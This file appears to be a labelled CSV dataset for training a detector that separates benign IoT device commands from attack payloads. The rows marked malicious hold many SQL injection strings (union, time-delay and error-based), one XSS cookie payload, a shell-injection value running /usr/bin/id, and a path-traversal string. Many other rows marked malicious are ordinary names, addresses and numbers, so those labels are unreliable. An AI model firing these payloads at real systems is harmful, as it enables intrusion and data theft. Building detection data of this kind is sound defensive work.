payload,label,attack_type
zarzosa de ro pisuerga,malicious,cmd_parse_error
brisia,malicious,cmd_parse_error
"echo, ['ready', 'safe', 'sensor']",benign,norm
"run_cmd, ADD 409 759",benign,norm
"echo, ['device', 'system']",benign,norm
"run_cmd, ADD 902 437",benign,norm
"1%'))) union all select null,null,null,null#",malicious,cmd_parse_error
"start_temp_report, 67",benign,norm
1'+(select hett where 7228=7228;waitfor delay '0:0:5')+',malicious,cmdi
"1%')) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (('%'='",malicious,cmd_parse_error
"1'||(select 'jpso' from dual where 9357=9357 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))))||'",malicious,cmdi
"echo, ['hello', 'payload', 'data', 'ping']",benign,norm
"start_temp_report, 82",benign,norm
503,malicious,cmd_parse_error
7694435206249147,malicious,cmd_parse_error
"echo, ['iot', 'ready', 'data', 'mqtt']",benign,norm
"run_cmd, echo ['ready', 'device']",benign,norm
"-4480') where 4661=4661 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",malicious,cmd_parse_error
"start_temp_report, 88",benign,norm
"run_cmd, echo ['safe']",benign,norm
"run_cmd, ADD 6 420",benign,norm
8466112924954826,malicious,cmd_parse_error
crioja,malicious,cmd_parse_error
"start_temp_report, 77",benign,norm
"echo, ['esp32', 'hello', 'data', 'mqtt']",benign,norm
"1"") as jscj where 2308=2308 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",malicious,cmd_parse_error
4226046499602528,malicious,cmd_parse_error
"run_cmd, echo ['safe']",benign,norm
"echo, ['device', 'status']",benign,norm
"run_cmd, ADD 948 864",benign,norm
"run_cmd, ADD 347 980",benign,norm
"echo, ['esp32', 'iot', 'ready', 'world']",benign,norm
"run_cmd, ADD 328 13",benign,norm
7022174850420090,malicious,cmd_parse_error
"echo, ['report', 'system', 'status']",benign,norm
pataki-grifties@hiteurope.by,malicious,cmd_parse_error
"start_temp_report, 71",benign,norm
"1"" where 4082=4082 and elt(5699=1432,1432)--",malicious,cmd_parse_error
"-1583') or elt(1032=1032,3623) and ('jrcj' like 'jrcj",malicious,cmd_parse_error
3186627053603991,malicious,cmd_parse_error
"run_cmd, ADD 484 718",benign,norm
"start_temp_report, 21",benign,norm
toro,malicious,cmd_parse_error
1 where 9872=9872;select (case when (3863=1151) then 3863 else cast(1 as int)/(select 0 from dual) end) from dual--,malicious,cmdi
"echo, ['iot']",benign,norm
satorras maynol,malicious,cmd_parse_error
44142,malicious,cmd_parse_error
83217349z,malicious,cmd_parse_error
"joyosa, la",malicious,cmd_parse_error
"run_cmd, echo ['device', 'ok']",benign,norm
"1' and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)",malicious,cmdi
"run_cmd, echo ['system', 'data', 'device']",benign,norm
rapetto picabea,malicious,cmd_parse_error
"run_cmd, ADD 286 719",benign,norm
amarili,malicious,cmd_parse_error
"start_temp_report, 89",benign,norm
mercantesca,malicious,cmd_parse_error
"run_cmd, ADD 943 607",benign,norm
"run_cmd, echo ['ok', 'mqtt', 'status']",benign,norm
"echo, ['hello', 'system', 'safe']",benign,norm
58772485x,malicious,cmd_parse_error
agatn,malicious,cmd_parse_error
"run_cmd, ADD 183 174",benign,norm
"echo, ['ok', 'data', 'esp32', 'system']",benign,norm
tapani9,malicious,cmd_parse_error
"run_cmd, echo ['data']",benign,norm
"start_temp_report, 19",benign,norm
"-7248"") or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (""qgms""=""qgms",malicious,cmdi
wester0,malicious,cmd_parse_error
/......................................................................................{file},malicious,cmd_parse_error
"1'||(select 'drna' from dual where 5082=5082 and 3824=benchmark(5000000,md5(0x76555642)))||'",malicious,cmdi
branchadell arribas,malicious,cmd_parse_error
1') where 5331=5331;begin dbms_lock.sleep(5); end--,malicious,cmdi
"-6815 where 7609=7609 or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",malicious,cmd_parse_error
"run_cmd, ADD 195 684",benign,norm
"run_cmd, ADD 699 535",benign,norm
7333723607992322,malicious,cmd_parse_error
"run_cmd, ADD 198 342",benign,norm
mallejac,malicious,cmd_parse_error
"c/ torregrossa, 3",malicious,cmd_parse_error
"start_temp_report, 17",benign,norm
clavel_keegan@apelton.gy,malicious,cmd_parse_error
pech+e,malicious,cmd_parse_error
"-3316%"" or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ""%""=""",malicious,cmdi
"run_cmd, ADD 101 262",benign,norm
"start_temp_report, 67",benign,norm
1;select sleep(5)# wihl,malicious,cmdi
chisvert,malicious,cmd_parse_error
"echo, ['device', 'ping']",benign,norm
reese@housemovie.net,malicious,cmd_parse_error
vildo@prensahp.fj,malicious,cmd_parse_error
"start_temp_report, 17",benign,norm
"echo, ['ping', 'sensor']",benign,norm
"1)) as pxmz where 2596=2596;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",malicious,cmdi
"1%'));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and (('%'='",malicious,cmdi
griffith_chesbro@psykoterapeut.sn,malicious,cmd_parse_error
peri portaneri,malicious,cmd_parse_error
"run_cmd, echo ['esp32', 'sensor', 'hello']",benign,norm
"run_cmd, ADD 719 530",benign,norm
gastn,malicious,cmd_parse_error
"1'))) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ((('zpkv'='zpkv",malicious,cmd_parse_error
sagues villacro,malicious,cmd_parse_error
"start_temp_report, 33",benign,norm
"c/ san salvador, 34, 10?f",malicious,cmd_parse_error
"echo, ['hello', 'normal', 'system']",benign,norm
"echo, ['world']",benign,norm
"calle profeta, 96, 2?c",malicious,cmd_parse_error
"start_temp_report, 120",benign,norm
"run_cmd, echo ['device', 'sensor', 'data', 'system']",benign,norm
blomfield@enlanzarote.com.al,malicious,cmd_parse_error
salma,malicious,cmd_parse_error
"1)) as ambt where 5198=5198 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)--",malicious,cmdi
"start_temp_report, 93",benign,norm
"run_cmd, echo ['esp32', 'ready']",benign,norm
"start_temp_report, 117",benign,norm
"start_temp_report, 64",benign,norm
"echo, ['mqtt', 'normal', 'ready']",benign,norm
"run_cmd, echo ['iot']",benign,norm
"run_cmd, ADD 706 423",benign,norm
"echo, ['mqtt']",benign,norm
villanueva de algaidas,malicious,cmd_parse_error
"echo, ['payload', 'esp32']",benign,norm
"start_temp_report, 106",benign,norm
"echo, ['mqtt', 'payload', 'iot']",benign,norm
"start_temp_report, 93",benign,norm
87105030m,malicious,cmd_parse_error
"start_temp_report, 72",benign,norm
que3h5a,malicious,cmd_parse_error
"echo, ['ok', 'ready', 'device']",benign,norm
"run_cmd, echo ['hello']",benign,norm
"-1993%"") or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and (""%""=""",malicious,cmdi
"run_cmd, ADD 990 592",benign,norm
"run_cmd, ADD 621 565",benign,norm
gallart cocm,malicious,cmd_parse_error
"run_cmd, ADD 788 897",benign,norm
"start_temp_report, 117",benign,norm
"run_cmd, echo ['status']",benign,norm
"start_temp_report, 4",benign,norm
"echo, ['normal', 'status', 'device']",benign,norm
"start_temp_report, 104",benign,norm
"run_cmd, ADD 996 442",benign,norm
"run_cmd, ADD 304 214",benign,norm
6615,malicious,cmd_parse_error
"echo, ['ok', 'mqtt']",benign,norm
"run_cmd, echo ['ok', 'sensor', 'ready']",benign,norm
cho5readu3a,malicious,cmd_parse_error
marracos,malicious,cmd_parse_error
"start_temp_report, 108",benign,norm
"1"") as crek where 6570=6570 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",malicious,cmdi
"echo, ['safe', 'ok', 'normal']",benign,norm
50779094q,malicious,cmd_parse_error
"run_cmd, ADD 274 873",benign,norm
"run_cmd, ADD 680 766",benign,norm
34196882e,malicious,cmd_parse_error
1') and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))),malicious,cmd_parse_error
eduardo,malicious,cmd_parse_error
reith,malicious,cmd_parse_error
-7535) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))),malicious,cmd_parse_error
"run_cmd, echo ['sensor', 'status', 'data']",benign,norm
"run_cmd, echo ['ok', 'ready', 'system', 'safe']",benign,norm
marino,malicious,cmd_parse_error
"start_temp_report, 74",benign,norm
"start_temp_report, 11",benign,norm
75834762j,malicious,cmd_parse_error
"run_cmd, echo ['ping', 'iot', 'ready']",benign,norm
"run_cmd, ADD 800 701",benign,norm
hontanares de eresma,malicious,cmd_parse_error
"start_temp_report, 112",benign,norm
"start_temp_report, 30",benign,norm
"run_cmd, echo ['mqtt', 'esp32', 'system', 'world']",benign,norm
1'+(select enzd where 6046=6046 and (3020=3020)*6703)+',malicious,cmd_parse_error
7196721387049140,malicious,cmd_parse_error
"1%""))) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (((""%""=""",malicious,cmd_parse_error
"echo, ['sensor', 'system', 'payload', 'normal']",benign,norm
"echo, ['sensor', 'normal', 'report', 'safe']",benign,norm
"run_cmd, echo ['safe']",benign,norm
"run_cmd, echo ['esp32', 'payload', 'safe', 'ping']",benign,norm
"run_cmd, ADD 486 789",benign,norm
"-3933%"")) or elt(8142=2978,2978) and ((""%""=""",malicious,cmd_parse_error
mialgi5,malicious,cmd_parse_error
"run_cmd, ADD 485 698",benign,norm
bourget,malicious,cmd_parse_error
"1"";begin user_lock.sleep(5); end and ""mdje"" like ""mdje",malicious,cmdi
"1%""))) or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",malicious,cmd_parse_error
takakura@cenitsoria.sb,malicious,cmd_parse_error
"-4465%' union all select 6196,6196,6196,6196,6196,6196,6196,6196--",malicious,cmd_parse_error
"start_temp_report, 3",benign,norm
5031,malicious,cmd_parse_error
"c/ 57 15, 9g",malicious,cmd_parse_error
"echo, ['ready', 'iot', 'world', 'payload']",benign,norm
"-6007"")) union all select 6019,6019,6019,6019,6019,6019,6019,6019--",malicious,cmd_parse_error
"-9932"" union all select 4049,4049,4049--",malicious,cmd_parse_error
saysanasy@grupodescansoyhogar.gl,malicious,cmd_parse_error
"run_cmd, ADD 60 384",benign,norm
"1') as vmmk where 5757=5757 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",malicious,cmd_parse_error
trejan@carloshoya.mo,malicious,cmd_parse_error
"run_cmd, ADD 931 717",benign,norm
"run_cmd, echo ['safe', 'ok', 'data', 'iot']",benign,norm
adaiana,malicious,cmd_parse_error
"start_temp_report, 94",benign,norm
7626699319590675,malicious,cmd_parse_error
"run_cmd, ADD 568 574",benign,norm
c/ calzada 169,malicious,cmd_parse_error
82839528z,malicious,cmd_parse_error
"start_temp_report, 64",benign,norm
"run_cmd, echo ['system']",benign,norm
"run_cmd, ADD 389 502",benign,norm
"start_temp_report, 92",benign,norm
"start_temp_report, 29",benign,norm
"run_cmd, ADD 344 909",benign,norm
sim5e469,malicious,cmd_parse_error
"calle vizcaya, 101 10?f",malicious,cmd_parse_error
5788,malicious,cmd_parse_error
"echo, ['world']",benign,norm
ozselcuk,malicious,cmd_parse_error
"run_cmd, ADD 522 676",benign,norm
creight,malicious,cmd_parse_error
1'+(select 'rpds' where 5870=5870 and 4595=4595#,malicious,cmd_parse_error
alavez anabalon,malicious,cmd_parse_error
grandia zarzosa,malicious,cmd_parse_error
"start_temp_report, 95",benign,norm
"run_cmd, ADD 800 836",benign,norm
fontbern maurici,malicious,cmd_parse_error
"run_cmd, echo ['mqtt', 'ok', 'report', 'status']",benign,norm
c:oot.ini,malicious,cmd_parse_error
1') waitfor delay '0:0:5' and ('vtfs'='vtfs,malicious,cmd_parse_error
"run_cmd, echo ['normal', 'device']",benign,norm
27404814s,malicious,cmd_parse_error
"run_cmd, ADD 64 745",benign,norm
"run_cmd, ADD 359 575",benign,norm
"1"") where 6311=6311;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",malicious,cmdi
"start_temp_report, 74",benign,norm
49181,malicious,cmd_parse_error
"-7637"" union all select 8498,8498,8498--",malicious,cmd_parse_error
"start_temp_report, 75",benign,norm
"run_cmd, ADD 200 768",benign,norm
"run_cmd, ADD 553 958",benign,norm
"1"")) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((""uglh"" like ""uglh",malicious,cmd_parse_error
"run_cmd, echo ['report', 'mqtt']",benign,norm
gorfine,malicious,cmd_parse_error
"start_temp_report, 83",benign,norm
"echo, ['data']",benign,norm
"run_cmd, echo ['ping', 'ready']",benign,norm
08880,malicious,cmd_parse_error
"start_temp_report, 68",benign,norm
"1"")) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ((""nubc"" like ""nubc",malicious,cmdi
"start_temp_report, 84",benign,norm
37159,malicious,cmd_parse_error
30718466b,malicious,cmd_parse_error
"start_temp_report, 94",benign,norm
"run_cmd, echo ['iot', 'mqtt']",benign,norm
"echo, ['safe', 'data', 'ready']",benign,norm
46145,malicious,cmd_parse_error
69557398q,malicious,cmd_parse_error
"run_cmd, ADD 159 172",benign,norm
<style>@im\\port'\\ja asc ipt:document.cookie=true';</style>,malicious,xss
"start_temp_report, 60",benign,norm
48898173n,malicious,cmd_parse_error
"run_cmd, ADD 63 943",benign,norm
"start_temp_report, 26",benign,norm
tsampoulas_chartrand@purplemoongrn.za,malicious,cmd_parse_error
3362439041972349,malicious,cmd_parse_error
"start_temp_report, 15",benign,norm
"run_cmd, ADD 464 453",benign,norm
"run_cmd, echo ['ready', 'safe']",benign,norm
"echo, ['world', 'sensor']",benign,norm
"run_cmd, ADD 66 373",benign,norm
"run_cmd, ADD 61 428",benign,norm
"1%')))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ((('%'='",malicious,cmdi
25245,malicious,cmd_parse_error
"run_cmd, echo ['payload', 'report', 'system', 'mqtt']",benign,norm
"run_cmd, ADD 179 666",benign,norm
"echo, ['ready', 'data']",benign,norm
radunsky_oses@guejosgratis.cg,malicious,cmd_parse_error
59di51ca1,malicious,cmd_parse_error
9141,malicious,cmd_parse_error
*r6t58a,malicious,cmd_parse_error
"run_cmd, echo ['ready', 'device', 'world']",benign,norm
"echo, ['mqtt']",benign,norm
"run_cmd, ADD 693 340",benign,norm
repinarse,malicious,cmd_parse_error
"-8203"") union all select 6394,6394,6394,6394,6394--",malicious,cmd_parse_error
"echo, ['mqtt', 'report', 'iot']",benign,norm
"echo, ['mqtt', 'esp32']",benign,norm
"echo, ['payload', 'status', 'iot', 'world']",benign,norm
"run_cmd, ADD 950 806",benign,norm
"run_cmd, ADD 949 289",benign,norm
"echo, ['report', 'esp32']",benign,norm
"start_temp_report, 4",benign,norm
blenkarn6,malicious,cmd_parse_error
"run_cmd, ADD 226 983",benign,norm
"echo, ['ok', 'mqtt', 'device']",benign,norm
"1"")) as mvxa where 3024=3024;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#",malicious,cmdi
aeriel,malicious,cmd_parse_error
"run_cmd, ADD 952 46",benign,norm
"echo, ['ping']",benign,norm
felipa,malicious,cmd_parse_error
7as72110,malicious,cmd_parse_error
"-8043%""))) or make_set(9354=9354,7185) and (((""%""=""",malicious,cmd_parse_error
"run_cmd, echo ['iot', 'normal', 'report']",benign,norm
5805206307747545,malicious,cmd_parse_error
26133,malicious,cmd_parse_error
"run_cmd, ADD 853 133",benign,norm
"start_temp_report, 37",benign,norm
22,malicious,cmd_parse_error
"run_cmd, echo ['normal', 'data', 'sensor']",benign,norm
"echo, ['ok']",benign,norm
"run_cmd, echo ['safe', 'normal', 'sensor', 'mqtt']",benign,norm
7665578374246731,malicious,cmd_parse_error
-3598) union all select 2264#,malicious,cmd_parse_error
"run_cmd, ADD 186 923",benign,norm
benalup-casas viejas,malicious,cmd_parse_error
0399278648684869,malicious,cmd_parse_error
"echo, ['payload', 'esp32', 'device']",benign,norm
bansal,malicious,cmd_parse_error
"carrer lepant, 128, 11-g",malicious,cmd_parse_error
"1%"";if(7899=7899) select 7899 else drop function zbbp--",malicious,cmdi
3mo5c8po,malicious,cmd_parse_error
45643261z,malicious,cmd_parse_error
"run_cmd, ADD 86 705",benign,norm
"1"" where 5477=5477;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",malicious,cmdi
1));(select * from (select(sleep(5)))acdk)#,malicious,cmdi
21890,malicious,cmd_parse_error
"echo, ['world']",benign,norm
"run_cmd, ADD 240 370",benign,norm
"run_cmd, echo ['mqtt']",benign,norm
"start_temp_report, 76",benign,norm
"echo, ['sensor', 'system', 'data', 'normal']",benign,norm
goubanov@delujos.bg,malicious,cmd_parse_error
4105436805418109,malicious,cmd_parse_error
"echo, ['ping', 'esp32', 'mqtt', 'status']",benign,norm
"start_temp_report, 61",benign,norm
"1"" or (select * from (select(sleep(5)))ydpu) and ""pxix""=""pxix",malicious,cmd_parse_error
85981189j,malicious,cmd_parse_error
maurici garrudo,malicious,cmd_parse_error
"echo, ['esp32', 'safe']",benign,norm
"run_cmd, echo ['device', 'report', 'payload']",benign,norm
"-8735')) union all select 3262,3262,3262--",malicious,cmd_parse_error
23865566f,malicious,cmd_parse_error
"run_cmd, echo ['sensor']",benign,norm
"-2241))) or make_set(9354=9354,7185) and (((6840=6840",malicious,cmd_parse_error
mulleras picornel,malicious,cmd_parse_error
"echo, ['data', 'status']",benign,norm
"run_cmd, ADD 265 389",benign,norm
"run_cmd, echo ['iot', 'data', 'ping']",benign,norm
45790,malicious,cmd_parse_error
"start_temp_report, 113",benign,norm
"run_cmd, echo ['data', 'hello', 'sensor']",benign,norm
av. mar 63 10?g,malicious,cmd_parse_error
urgeles montanuy,malicious,cmd_parse_error
harris,malicious,cmd_parse_error
"run_cmd, ADD 360 740",benign,norm
"1"") as zbhs where 2017=2017 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)--",malicious,cmdi
cooperma,malicious,cmd_parse_error
metacntrico,malicious,cmd_parse_error
"run_cmd, echo ['iot', 'system', 'sensor']",benign,norm
"-8599)) or elt(5628=2324,2324) and ((1134=1134",malicious,cmd_parse_error
"1') as dvoy where 7906=7906 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",malicious,cmdi
"1%"" union all select null,null,null,null,null--",malicious,cmd_parse_error
"c/ los escribanos 98,",malicious,cmd_parse_error
"start_temp_report, 43",benign,norm
"echo, ['ready', 'status', 'sensor']",benign,norm
4916,malicious,cmd_parse_error
"1' and 3824=benchmark(5000000,md5(0x76555642))",malicious,cmd_parse_error
"echo, ['sensor']",benign,norm
"run_cmd, ADD 443 867",benign,norm
"start_temp_report, 47",benign,norm
descabellar,malicious,cmd_parse_error
"1'+(select 'drvv' where 5622=5622 and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",malicious,cmd_parse_error
"run_cmd, echo ['report']",benign,norm
shupe,malicious,cmd_parse_error
calle codigo correspondencia oficial correos-telegrafos 33,malicious,cmd_parse_error
"run_cmd, echo ['world', 'safe', 'ok', 'ready']",benign,norm
castellar de santiago,malicious,cmd_parse_error
"start_temp_report, 107",benign,norm
"echo, ['payload']",benign,norm
"echo, ['payload', 'ready', 'esp32']",benign,norm
"-5198))) union all select 7089,7089,7089,7089,7089,7089,7089,7089#",malicious,cmd_parse_error
walliw,malicious,cmd_parse_error
marsdon@hrmsl.cn,malicious,cmd_parse_error
"run_cmd, ADD 491 745",benign,norm
"run_cmd, echo ['system', 'hello', 'esp32', 'world']",benign,norm
"echo, ['normal', 'payload', 'hello', 'iot']",benign,norm
"-2284%"")) or 9323=9323#",malicious,cmd_parse_error
"calle santander, 0,",malicious,cmd_parse_error
lauze,malicious,cmd_parse_error
a;/usr/bin/id|,malicious,cmdi
"start_temp_report, 58",benign,norm
"start_temp_report, 101",benign,norm
"start_temp_report, 36",benign,norm
73034797e,malicious,cmd_parse_error
"start_temp_report, 18",benign,norm
"run_cmd, ADD 592 716",benign,norm
"1"")) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((""vypw"" like ""vypw",malicious,cmd_parse_error
malaquas,malicious,cmd_parse_error
"run_cmd, ADD 458 152",benign,norm
pompilio,malicious,cmd_parse_error
-6014')) or (9860=4848)*4848 and (('qtge'='qtge,malicious,cmd_parse_error
"1'+(select 'gjaq' where 5449=5449 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null))+'",malicious,cmdi
"start_temp_report, 72",benign,norm
22484,malicious,cmd_parse_error
"1""))) and (select * from (select(sleep(5)))fzno) and (((""uncg""=""uncg",malicious,cmd_parse_error
6411,malicious,cmd_parse_error
"echo, ['status', 'sensor', 'normal']",benign,norm
"start_temp_report, 12",benign,norm
"run_cmd, echo ['device', 'mqtt', 'world', 'status']",benign,norm
brihuega uslet,malicious,cmd_parse_error
"echo, ['data', 'system', 'status', 'world']",benign,norm
6974700055894599,malicious,cmd_parse_error
"1' in boolean mode);select benchmark(5000000,md5(0x4c4d6142))#",malicious,cmdi
"echo, ['ping']",benign,norm
"run_cmd, echo ['ok', 'report', 'sensor']",benign,norm
hixon,malicious,cmd_parse_error
"run_cmd, ADD 501 813",benign,norm
"run_cmd, echo ['data', 'hello', 'payload', 'esp32']",benign,norm
"run_cmd, ADD 307 818",benign,norm
"echo, ['ping', 'ready']",benign,norm
"echo, ['hello', 'normal']",benign,norm
"start_temp_report, 98",benign,norm
"echo, ['ready', 'hello', 'iot', 'data']",benign,norm
"1',(select (case when (1392=1380) then 1 else 1392*(select 1392 from master..sysdatabases) end))",malicious,cmd_parse_error
"start_temp_report, 81",benign,norm
9061531800144737,malicious,cmd_parse_error
"start_temp_report, 11",benign,norm
reco+nocida,malicious,cmd_parse_error
1%') and 8594=(select 8594 from pg_sleep(5))--,malicious,cmd_parse_error
quilino,malicious,cmd_parse_error
73862262q,malicious,cmd_parse_error
sollman,malicious,cmd_parse_error
ermin,malicious,cmd_parse_error
"echo, ['data', 'sensor']",benign,norm
"run_cmd, echo ['normal', 'system', 'sensor', 'mqtt']",benign,norm
"echo, ['iot', 'data', 'ping', 'payload']",benign,norm
"start_temp_report, 78",benign,norm
1886,malicious,cmd_parse_error
"start_temp_report, 19",benign,norm
"run_cmd, echo ['data', 'ready', 'esp32', 'device']",benign,norm
0andiar,malicious,cmd_parse_error
"run_cmd, echo ['safe', 'normal']",benign,norm
1') and (3020=3020)*6703 and ('lhfa'='lhfa,malicious,cmd_parse_error
6273831231107298,malicious,cmd_parse_error
3118,malicious,cmd_parse_error
carrer riu sena s/n 13-c,malicious,cmd_parse_error
"run_cmd, echo ['system', 'device']",benign,norm
"run_cmd, ADD 307 215",benign,norm
"start_temp_report, 80",benign,norm
dafoe,malicious,cmd_parse_error
"run_cmd, echo ['device', 'status', 'iot', 'report']",benign,norm
wambsgan,malicious,cmd_parse_error
"1%""));select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",malicious,cmdi
"echo, ['system', 'status', 'payload', 'iot']",benign,norm
"start_temp_report, 14",benign,norm
1' in boolean mode) and 8594=(select 8594 from pg_sleep(5))--,malicious,cmd_parse_error
"1"") as cysq where 5258=5258;select case when 1574=5523 then 1 else null end--",malicious,cmdi
"run_cmd, echo ['safe', 'mqtt']",benign,norm
"run_cmd, ADD 773 835",benign,norm
8030e,malicious,cmd_parse_error
zoq3et1r8,malicious,cmd_parse_error
83236273d,malicious,cmd_parse_error
"run_cmd, ADD 717 73",benign,norm
"1%"";begin user_lock.sleep(5); end--",malicious,cmdi
"run_cmd, echo ['system']",benign,norm
curul,malicious,cmd_parse_error
"start_temp_report, 113",benign,norm
1' where 6168=6168;(select * from (select(sleep(5)))srmq)--,malicious,cmdi
o'kinghtons camarena,malicious,cmd_parse_error
"1"") as hymr where 5497=5497 union all select null,null,null,null--",malicious,cmd_parse_error
"run_cmd, ADD 819 300",benign,norm
"start_temp_report, 69",benign,norm
-7742) as tgzq where 7842=7842 or 2062=1563,malicious,cmd_parse_error
"1));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",malicious,cmdi
malethia,malicious,cmd_parse_error
"run_cmd, echo ['payload', 'ready', 'system', 'data']",benign,norm
"run_cmd, echo ['world', 'sensor']",benign,norm
"cami sant cugat al papiol 59,",malicious,cmd_parse_error
aira vials,malicious,cmd_parse_error
6679885410766577,malicious,cmd_parse_error
"run_cmd, ADD 158 779",benign,norm
"run_cmd, ADD 192 493",benign,norm
"start_temp_report, 42",benign,norm
"echo, ['ping', 'normal', 'safe']",benign,norm
nicforo,malicious,cmd_parse_error
"echo, ['ok', 'device']",benign,norm
"1"" and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ""vukd""=""vukd",malicious,cmdi
"-6987' union all select 4721,4721--",malicious,cmd_parse_error
"echo, ['esp32', 'ready', 'ok', 'hello']",benign,norm
elssser gula,malicious,cmd_parse_error
"echo, ['system', 'safe']",benign,norm
24830,malicious,cmd_parse_error
10858,malicious,cmd_parse_error
sada,malicious,cmd_parse_error
bertoldo,malicious,cmd_parse_error
"1"")) as xwrq where 4161=4161;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",malicious,cmdi
"run_cmd, echo ['esp32', 'report']",benign,norm
forsyne@velaconsultores.mx,malicious,cmd_parse_error
wamba,malicious,cmd_parse_error
5481930163785901,malicious,cmd_parse_error
selbrede,malicious,cmd_parse_error
"start_temp_report, 51",benign,norm
4501,malicious,cmd_parse_error
"echo, ['ready']",benign,norm
5861000706039696,malicious,cmd_parse_error
"1 or elt(6272=6272,sleep(5))-- ilfc",malicious,cmd_parse_error
"run_cmd, ADD 322 741",benign,norm
"start_temp_report, 77",benign,norm
aparicio andreu,malicious,cmd_parse_error
3468950887704772,malicious,cmd_parse_error
"1"" where 4066=4066 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)--",malicious,cmd_parse_error
"echo, ['data', 'esp32', 'ok']",benign,norm
carrer puigmercadal 33 5h,malicious,cmd_parse_error
castellanos de castro,malicious,cmd_parse_error
jernima,malicious,cmd_parse_error
"run_cmd, ADD 758 863",benign,norm
